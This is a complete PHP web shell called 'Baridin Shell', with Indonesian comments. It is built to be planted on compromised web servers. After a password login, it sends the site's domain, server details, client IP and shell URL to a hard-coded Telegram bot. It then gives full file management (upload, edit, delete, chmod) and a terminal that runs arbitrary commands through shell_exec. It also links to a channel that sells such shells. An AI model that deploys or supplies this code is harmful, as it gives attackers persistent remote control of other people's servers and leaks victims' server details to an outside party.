<?php
session_start();

// == Konfigurasi ==
$botToken = "7773053413:AAEkbvDKVgxOgyIXWSxbVOzMjGCQuzwpRb4";
$chatId = "7325256586";
$salt = "baridinsalt2025";
$password_hash = md5("flo" . $salt);
$self = $_SERVER['PHP_SELF'];
$domain = $_SERVER['HTTP_HOST'];

// == Fungsi login ==
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
        if (md5($_POST['pass'] . $salt) === $password_hash) {
            $_SESSION['logged_in'] = true;
            $server = php_uname();
            $ip = $_SERVER['REMOTE_ADDR'];
            $msg = "ðŸ›¡ï¸ *Baridin Shell Login*\nDomain: `$domain`\nServer: `$server`\nClient IP: `$ip`\nFile: `http://$domain$self`";
            $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg) . "&parse_mode=Markdown";
            @file_get_contents($url);
            header("Location: $self");
            exit;
        } else {
            $error = "Wrong password.";
        }
    }
    echo '<style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:100px}input{background:#111;color:#0f0;border:1px solid #0f0;padding:5px;}</style>';
    echo '<form method="POST"><h2>Login Shell</h2><input type="password" name="pass" placeholder="Password"> <input type="submit" value="Login"><br>';
    if (isset($error)) echo "<div>$error</div>";
    echo '</form>';
    exit;
}

// == Fungsi utilitas ==
function perms($file) {
    $perms = fileperms($file);
    $info = '';
    if (is_dir($file)) $info = 'd';
    elseif (is_link($file)) $info = 'l';
    else $info = '-';
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? 'x' : '-';
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? 'x' : '-';
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? 'x' : '-';
    return $info;
}
function getSize($size) {
    $units = ['B','KB','MB','GB','TB'];
    for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
    return round($size, 2) . ' ' . $units[$i];
}

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
chdir($path);
$path = getcwd();

// == Upload ==
if (isset($_FILES['upload'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], $path . '/' . $_FILES['upload']['name']);
}

// == Create file ==
if (isset($_POST['create_file']) && $_POST['filename']) {
    $file = $path . '/' . basename($_POST['filename']);
    file_put_contents($file, '');
}

// == Create dir ==
if (isset($_POST['create_dir']) && $_POST['dirname']) {
    mkdir($path . '/' . basename($_POST['dirname']));
}

// == Rename ==
if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
    rename($_POST['rename_from'], $_POST['rename_to']);
}

// == Delete ==
if (isset($_GET['delete'])) {
    $f = $_GET['delete'];
    is_dir($f) ? rmdir($f) : unlink($f);
}

// == Chmod ==
if (isset($_POST['chmod_file']) && isset($_POST['chmod_val'])) {
    chmod($_POST['chmod_file'], octdec($_POST['chmod_val']));
}

// == Touch + Edit ==
if (isset($_GET['touch'])) {
    $f = $_GET['touch'];
    touch($f);
    $content = file_get_contents($f);
    echo <<<HTML
    <style>body{background:#000;color:#fff;font-family:monospace;padding:10px;}textarea,input{background:#111;color:#fff;border:1px solid #00ff00;}a{color:#00ff00;}</style>
    <h3>Edit (Touch): $f</h3>
    <form method="POST">
    <textarea name="content" rows="25" style="width:100%">{$content}</textarea><br>
    <input type="hidden" name="file" value="{$f}">
    <input type="submit" name="save_touch" value="Save"></form><hr>
    <a href="{$self}?path=" . urlencode(dirname($f)) . '">Back</a>
HTML;
    exit;
}
if (isset($_POST['save_touch']) && isset($_POST['file'])) {
    file_put_contents($_POST['file'], $_POST['content']);
}

// == Edit file ==
if (isset($_GET['edit']) && file_exists($_GET['edit'])) {
    $file = $_GET['edit'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        echo "<b>Saved.</b><br>";
    }
    $content = htmlspecialchars(file_get_contents($file));
    echo "<style>body{background:#000;color:#fff;font-family:monospace;padding:10px;}textarea,input{background:#111;color:#fff;border:1px solid #00ff00;}a{color:#00ff00;}</style>";
    echo "<h3>Edit File: $file</h3><form method='POST'>";
    echo "<textarea name='content' rows='25' style='width:100%'>$content</textarea><br>";
    echo "<input type='submit' value='Save'></form><hr>";
    echo "<a href='$self?path=" . urlencode(dirname($file)) . "'>Back</a>";
    exit;
}

// == Terminal via AJAX ==
if (isset($_POST['ajax_terminal']) && isset($_POST['cmd'])) {
    header('Content-Type: text/plain');
    $output = shell_exec($_POST['cmd']);
    echo $output ?: "(no output)";
    exit;
}

// == Tampilan HTML ==
echo "<!DOCTYPE html><html><head><title>Baridin Shell</title><style>
body{background:#000;color:#0f0;font-family:monospace;}
a{color:#0f0;text-decoration:none;}a:hover{text-decoration:underline;}
table{width:100%;border-collapse:collapse;}
th,td{border:1px solid #0f0;padding:4px;}
th{background:#111;color:#fff;}
.writable{color:#00ff00;} .readonly{color:#ffffff;}
.center{text-align:center;margin:10px;}
input,textarea{background:#111;color:#0f0;border:1px solid #0f0;}
.box{border:1px solid #0f0;padding:10px;margin:10px 0;background:#111;}
</style></head><body>";

echo "<div class='box'><h2 style='color:white'>Baridin Shell</h2>";
$diskPath = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? 'C:' : '/';
$hostname = gethostname();
$os = php_uname();
$totalDisk = getSize(disk_total_space($diskPath));
$freeDisk = getSize(disk_free_space($diskPath));
$usedDisk = getSize(disk_total_space($diskPath) - disk_free_space($diskPath));

echo "<b>Server IP:</b> {$_SERVER['SERVER_ADDR']}<br>";
echo "<b>Client IP:</b> {$_SERVER['REMOTE_ADDR']}<br>";
echo "<b>Hostname:</b> $hostname<br>";
echo "<b>OS:</b> $os<br>";
echo "<b>Disk:</b> Used: $usedDisk / Free: $freeDisk / Total: $totalDisk</div>";

echo "<div class='center'>
<a href='$self'>[ Home ]</a> 
<a href='https://t.me/baridin_host' target='_blank'>[ Buy Shell ]</a> 
<a href='$self?logout=1'>[ Logout ]</a>
</div>";

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: $self");
    exit;
}

$parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
$nav = (DIRECTORY_SEPARATOR === "\\") ? substr($path, 0, 2) : "/";
$build = (DIRECTORY_SEPARATOR === "\\") ? substr($path, 0, 2) : "";
foreach ($parts as $part) {
    $build .= DIRECTORY_SEPARATOR . $part;
    $nav .= " / <a href='?path=" . urlencode($build) . "'>" . htmlspecialchars($part) . "</a>";
}
echo "<div class='box'><b>Path:</b> $nav</div>";

echo "<table><tr><th>Name</th><th>Size</th><th>Perm</th><th>Owner/Group</th><th>Modified</th><th>Action</th></tr>";
foreach (scandir($path) as $item) {
    if ($item == '.') continue;
    $full = "$path/$item";
    $permstr = perms($full);
    $permClass = is_writable($full) ? 'writable' : 'readonly';
    $owner = @posix_getpwuid(fileowner($full));
    $group = @posix_getgrgid(filegroup($full));
    $ownerName = $owner ? $owner['name'] : fileowner($full);
    $groupName = $group ? $group['name'] : filegroup($full);

    echo "<tr><td>";
    if (is_dir($full)) {
        echo "<a href='?path=" . urlencode($full) . "'>$item</a>";
    } else {
        echo "<a href='?edit=" . urlencode($full) . "'>$item</a>";
    }
    echo "</td><td>" . (is_file($full) ? getSize(filesize($full)) : '-') . "</td>";
    echo "<td><a class='$permClass' href='#'>$permstr</a></td>";
    echo "<td>$ownerName/$groupName</td>";
    echo "<td>" . date("Y-m-d H:i:s", filemtime($full)) . "</td><td>";
    echo "<a href='?edit=" . urlencode($full) . "'>E</a> ";
    echo "<a href='$self?rename_from=" . urlencode($full) . "'>R</a> ";
    echo "<a href='?touch=" . urlencode($full) . "'>T</a> ";
    if (is_file($full)) echo "<a href='" . urlencode($full) . "' download>S</a> ";
    echo "<a href='?delete=" . urlencode($full) . "' onclick='return confirm(\"Delete?\")'>D</a>";
    echo "</td></tr>";
}
echo "</table>";

echo "<div class='box'><form method='POST' enctype='multipart/form-data'>
<b>Upload:</b><br><input type='file' name='upload'><br><input type='submit' value='Upload'></form></div>";

echo "<div class='box'>
<b>Terminal:</b>
<form id='terminalForm'>
<input type='text' name='cmd' id='cmd' style='width:70%'> 
<input type='submit' value='Run'>
</form>
<pre id='output'></pre>
</div>";

echo "<div class='box'><form method='POST'>
<b>Create File:</b><br><input type='text' name='filename'> <input type='submit' name='create_file' value='Create'></form></div>";

echo "<div class='box'><form method='POST'>
<b>Create Directory:</b><br><input type='text' name='dirname'> <input type='submit' name='create_dir' value='Create'></form></div>";

echo "<div class='center'><a href='https://t.me/baridin_host' target='_blank'>&copy; Baridin</a></div>";

echo <<<JS
<script>
document.getElementById('terminalForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var cmd = document.getElementById('cmd').value;
    fetch("", {
        method: "POST",
        headers: {"Content-Type": "application/x-www-form-urlencoded"},
        body: "ajax_terminal=1&cmd=" + encodeURIComponent(cmd)
    })
    .then(response => response.text())
    .then(data => {
        document.getElementById('output').textContent = data;
    });
});
</script>
JS;

echo "</body></html>";
?>